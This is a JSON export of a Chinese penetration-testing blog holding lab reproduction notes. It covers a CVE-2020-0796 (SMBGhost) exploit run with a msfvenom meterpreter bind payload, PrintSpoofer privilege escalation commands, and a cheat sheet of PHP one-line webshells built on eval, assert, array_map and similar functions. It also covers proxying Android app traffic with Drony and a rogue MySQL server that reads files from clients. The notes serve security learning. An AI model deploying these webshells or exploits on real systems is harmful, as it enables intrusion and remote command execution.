{"meta":{"title":"YGnight's blog","subtitle":"","description":"","author":"YGnight","url":"http://ygnight.xyz","root":"/"},"pages":[{"title":"标签","date":"2019-12-12T08:50:35.000Z","updated":"2019-12-12T09:23:45.384Z","comments":true,"path":"tags/index.html","permalink":"http://ygnight.xyz/tags/index.html","excerpt":"","text":""},{"title":"资料信息","date":"2019-12-12T08:50:07.000Z","updated":"2020-05-28T03:37:02.444Z","comments":true,"path":"about/index.html","permalink":"http://ygnight.xyz/about/index.html","excerpt":"","text":"YGnight 原夜尽破晓团队队长"},{"title":"文章分类","date":"2019-12-12T09:24:10.553Z","updated":"2019-12-12T09:24:10.553Z","comments":true,"path":"categories/index.html","permalink":"http://ygnight.xyz/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-12-12T08:50:14.000Z","updated":"2019-12-12T08:50:14.037Z","comments":true,"path":"archives/index.html","permalink":"http://ygnight.xyz/archives/index.html","excerpt":"","text":""}],"posts":[{"title":"永恒之黑(cve-2020-0796)配合msf获取shell","slug":"永恒之黑(cve-2020-0796)配合msf获取shell","date":"2020-06-04T07:05:29.171Z","updated":"2020-06-04T07:47:03.159Z","comments":true,"path":"2020/06/04/永恒之黑(cve-2020-0796)配合msf获取shell/","link":"","permalink":"http://ygnight.xyz/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/","excerpt":"","text":"前言 今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记 影响范围Windows 10 Version 1903， Windows Server Version 1903(Server Core installation)，Windows 10 Version 1909， 和Windows Server Version 1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows 8和Windows Server 2012也有可能受到影响。 工具GitHub上Fork过来的 https://github.com/YGnight/SMBGhost_RCE_PoC kali集成 metasploit ：开源安全漏洞检测工具； msfvenom ：metasploit的标准payload生成器 实操使用msfvenom生成直连exploit 1msfvenom -p windows/x64/meterpreter/bind_tcp lport=1314 -f py -o cve-2020-0796.py 将生成的与脚本exploit.py里user_payload进行替换 使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4） 1python3 exploit.py -ip 192.168.168.130 运行metasploit （命令就不写出来了，截图都有） 指定目标机，run 得到shell","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"http://ygnight.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"pipePotato-新型通用提权","slug":"pipePotato-新型通用提权","date":"2020-05-08T02:35:08.963Z","updated":"2020-06-04T07:20:32.731Z","comments":true,"path":"2020/05/08/pipePotato-新型通用提权/","link":"","permalink":"http://ygnight.xyz/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/","excerpt":"","text":"影响范围本地提权，对于任意windows Server 2012以上的windows server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在 windows Server 2012， windows Server 2016， windows Server 2019 全补丁的情况都测试成功了。 工具GitHub上有源码，自行编译即可 具体操作cmd运行 whoami #查看权限 whoami /priv #查看是否具有SeImpersonatePrivilege权限 PrintSpoofer.exe -i -c &quot;whoami&quot; #查看权限是否提升为system","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"http://ygnight.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"PHP代码执行函数","slug":"PHP代码执行函数","date":"2020-01-13T08:20:20.808Z","updated":"2020-01-17T09:40:21.612Z","comments":true,"path":"2020/01/13/PHP代码执行函数/","link":"","permalink":"http://ygnight.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/","excerpt":"","text":"1、eval()函数#eval() 函数把字符串按照 PHP 代码来计算 #常见一句话： &lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;2、assert()函数#与eval类似 #常见一句话 &lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;3、array_map()函数#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。 #命令执行http://localhost/123.php?func=system cmd=whoami #菜刀连接http://localhost/123.php?func=assert 密码：cmd $func=$_GET[&apos;func&apos;]; $cmd=$_POST[&apos;cmd&apos;]; $array[0]=$cmd; $new_array=array_map($func,$array); echo $new_array;4、create_function()函数#创建匿名函数 #执行命令和上传文件参考eval函数(必须加分号)。 #菜刀连接密码：cmd $func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();5、preg_replace()函数#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;) #执行命令和上传文件参考assert函数(不需要加分号)。 #将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。 preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);6、call_user_func()函数#传入的参数作为assert函数的参数 #cmd=system(whoami) #菜刀连接密码：cmd call_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);7、call_user_func_array()函数#将传入的参数作为数组的第一个值传递给assert函数 #cmd=system(whoami) #菜刀连接密码：cmd $cmd=$_POST[&apos;cmd&apos;]; $array[0]=$cmd; call_user_func_array(&quot;assert&quot;,$array);8、array_filter()函数#用回调函数过滤数组中的元素：array_filter(数组,函数) #命令执行func=system&amp;cmd=whoami #菜刀连接http://localhost/123.php?func=assert 密码cmd $cmd=$_POST[&apos;cmd&apos;]; $array1=array($cmd); $func =$_GET[&apos;func&apos;]; array_filter($array1,$func);9、uasort()函数#php环境&gt;=&lt;5.6才能用 #uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 #命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami); #菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) 密码：cmd usort($_GET,&apos;asse&apos;.&apos;rt&apos;);","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://ygnight.xyz/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"使用drony解决APP无法抓包","slug":"使用drony解决APP无法抓包","date":"2019-12-18T06:58:30.602Z","updated":"2020-06-08T06:46:20.705Z","comments":true,"path":"2019/12/18/使用drony解决APP无法抓包/","link":"","permalink":"http://ygnight.xyz/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/","excerpt":"","text":"原因默认Flutter不会主动使用系统代理，需要单独设置。 解决方案使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。 环境常规配置：1.抓包工具安装，证书安装；2.安卓模拟器安装，并安装drony3.drony配置(这里试验抓闲鱼的数据包):进入drony,此时是off关闭状态， 向左划动，选择Wi-Fi 对wi-fi进行设置 选择代理模式为手动（Manual） Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all 选择Rule，设置应用规则 ) Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain， Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。 返回到主页面，点击off，变为启动状态 4.抓包工具配置：设置代理ip及端口 后续进行抓包常规操作即可","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"测试姿势","slug":"测试姿势","permalink":"http://ygnight.xyz/tags/%E6%B5%8B%E8%AF%95%E5%A7%BF%E5%8A%BF/"}]},{"title":"伪造mysql服务端实现任意文件读取","slug":"伪造mysql服务端实现任意文件读取","date":"2019-12-13T09:40:29.302Z","updated":"2020-06-04T10:03:45.769Z","comments":true,"path":"2019/12/13/伪造mysql服务端实现任意文件读取/","link":"","permalink":"http://ygnight.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"","text":"研究情况： 当遇到可控MYSQL时怎么进一步搞事情 情景：1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql 2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用） 3.。。。。。其他情况 所需环境：虚拟机两个，靶机装mysql，攻击端装py工具：https://github.com/YGnight/Mysqlist 工具介绍：exp_input.py脚本是输入文件，单独读取 启动 1python2 exp_input.py port （port为端口号，3306都可） 读取的文件最后保存在log文件夹下 复现：攻击端运行攻击脚本， exp_input.py 3306 输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini 靶机使用mysql向攻击端发送请求 password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记） 此时返回攻击端，可以看到dos窗口回显了信息 查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://ygnight.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]}]}